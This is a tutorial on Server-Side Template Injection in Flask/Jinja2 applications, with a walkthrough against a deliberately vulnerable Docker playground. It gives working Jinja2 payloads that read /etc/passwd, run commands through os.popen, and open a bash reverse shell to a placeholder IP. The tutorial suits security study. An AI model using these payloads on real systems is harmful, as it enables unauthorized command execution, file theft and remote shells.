**Server-Side Template Injection (SSTI)** is a security vulnerability in which an attacker can inject malicious code into a server *template*.

Server-side templates are files containing code that is used to generate *dynamic content* in a web application. Attackers can exploit an **SSTI** vulnerability to inject malicious code into a server template, allowing them to execute commands on the server and gain unauthorized access to both the web application and potentially sensitive data.

For example, imagine that a web application uses server templates to generate personalized emails. An attacker could exploit an **SSTI** vulnerability to inject malicious code into the email template, allowing the attacker to execute commands on the server and gain unauthorized access to the web application's sensitive data.

In a practical case, attackers can detect whether a Flask application is in use, for example, using tools such as **WhatWeb**. If an attacker detects that a Flask application is in use, he can attempt to exploit an **SSTI** vulnerability, since **Flask** uses the **Jinja2** template engine, which is vulnerable to this type of attack.

For attackers, detecting a Flask or Python application can be a first step in the process of trying to exploit an SSTI vulnerability. However, attackers can also try to identify SSTI vulnerabilities in other web applications using different templating frameworks, such as Django, Ruby on Rails, among others.

To prevent SSTI attacks, web application developers must properly validate and filter user input and use secure tools and template frameworks that implement security measures to prevent malicious code injection.

# Example

We are going to pull/run this [[Docker]] container for this example:

```bash
docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
```

We are going to indentify with **whatweb** what web technologies is being used by the web page:

```bash
whatweb "http://127.0.0.1:8089/"
```

We can see that it is running **Python**. Whenever we see that a server is running **Python** or a technology that uses **Python** such as **Flask** and we have the option to enter an input we can try to enter payloads from the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) website, for example:

```bash
# This is the basic payload, with it we can test if the web is vulnerable to SSTI, it should return 49
{{7*7}}

# We may be able to read a file
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

# We may be able to run remote code execution
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# We may be able to run remote code execution (reverse shell), we will put the '&' url-encoded as '%26' for avoiding errors
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/<IP>/443 0>%261"').read() }}
```

We must test all the payloads we are interested in because many of them may not work.